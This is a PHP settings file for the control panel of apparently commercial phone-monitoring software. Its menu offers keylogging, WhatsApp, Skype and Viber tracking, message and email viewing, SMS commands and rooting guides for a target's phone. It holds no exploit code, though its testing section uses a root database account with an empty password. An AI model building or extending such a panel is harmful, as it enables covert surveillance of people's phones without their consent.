<?php

use CS\Settings\GlobalSettings;

$default = array(
    'build' => $build['version'],
    'environment' => $build['environment'],
    'site' => $build['site'],
    'errorReporting' => E_ALL ^ E_NOTICE,
    'session' => array(
        'rememberMeTime' => 2592000 // 30 days
    ),
    'logger' => array(
        'stream' => array(
            'filename' => ROOT_PATH . 'logs/system.log'
        ),
        'mail' => array(
            'from' => 'orest@dataedu.com',
            'to' => 'orest@dataedu.com',
            'subject' => 'TS CP Logger'
        )
    ),
    'dbOptions' => array(
        PDO::MYSQL_ATTR_INIT_COMMAND => 'set names utf8;',
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
    ),
    'fenom' => array(
        'templatesDir' => ROOT_PATH . 'templates/',
        'compileDir' => ROOT_PATH . 'tmp/',
        'options' => array(
            'force_include' => true
        )
    ),
    'locales' => array(
        'en-GB' => 'English'
    ),
    'cpMenu' => array(
        'calls' => 'View Calls',
        'sms' => 'View SMS',
        'locations' => 'View Locations',
        'bookmarks' => array(
            'name' => 'View Bookmarks',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'browserHistory' => array(
            'name' => 'View Browser History',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'calendar' => array(
            'name' => 'View Calendar',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'contacts' => array(
            'name' => 'View Contacts',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'keylogger' => array(
            'name' => 'Keylogger',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'photos' => array(
            'name' => 'View Photos',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'videos' => array(
            'name' => 'View Videos',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'viber' => array(
            'name' => 'Viber Tracking',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'skype' => array(
            'name' => 'Skype Tracking',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'whatsapp' => array(
            'name' => 'Whatsapp Tracking',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'facebook' => array(
            'name' => 'Facebook Messages',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'vk' => array(
            'name' => 'VK Messages',
            'show' => function($di) {
                if ($di['locale'] != 'ru-RU') {
                    return false;
                }
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'emails' => array(
            'name' => 'View Emails',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'applications' => array(
            'name' => 'View Applications',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                }

                return true;
            }
        ),
        'smsCommands' => array(
            'name' => 'Sms Commands',
            'show' => function($di) {
                if ($di['currentDevice']['os'] == 'blackberry') {
                    return false;
                } elseif ($di['currentDevice']['os'] == 'android') {
                    return compareOSVersion('android', '4.4', $di['currentDevice']['os_version'], '<');
                }

                return true;
            }
        ),
        'settings' => 'Phone Settings'
    ),
    'contents' => array(
        'how-to-install/android-instructions.html' => 'Android Installation Guide',
        'how-to-install/blackberry-instructions.html' => 'BlackBerry Installation Guide',
        'how-to-install/ios-instructions.html' => 'iPhone Installation Guide',
        'how-to-install/root-instructions.html' => 'Root Instructions'
    )
);

if ($build['environment'] == 'production') {
    $default['db'] = GlobalSettings::getMainDbConfig();
    $default['dataDb'] = function($devId) {
        return GlobalSettings::getDeviceDatabaseConfig($devId);
    };

    $default['domain'] = GlobalSettings::getControlPanelURL($build['site']);
    $default['registration'] = GlobalSettings::getRegistrationPageURL($build['site']);
    $default['staticDomain'] = GlobalSettings::getControlPanelStaticURL($build['site']);
    $default['cookieDomain'] = GlobalSettings::getCookieDomain($build['site']);
    $default['supportEmail'] = GlobalSettings::getSupportEmail($build['site']);

    $default['s3'] = GlobalSettings::getS3Config();
    $default['cloudFront'] = GlobalSettings::getCloudFrontConfig();

    return $default;
} else if ($build['environment'] == 'development') {
    $default['errorReporting'] = E_ALL ^ E_NOTICE;

    $default['s3'] = GlobalSettings::getS3Config();
    $default['cloudFront'] = GlobalSettings::getCloudFrontConfig();
    $default['registration'] = 'http://www.google.com/registration/';

    if (file_exists(ROOT_PATH . 'development.config.php')) {
        require ROOT_PATH . 'development.config.php';
    }

    return $default;
} else if ($build['environment'] == 'testing') { // deprecated
    return array_merge($default, array(
        'db' => array(
            'host' => 'localhost',
            'username' => 'root',
            'password' => '',
            'dbname' => 'user_data_test',
            'options' => array(
                PDO::MYSQL_ATTR_INIT_COMMAND => 'set names latin1;',
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
            )
        )
    ));
}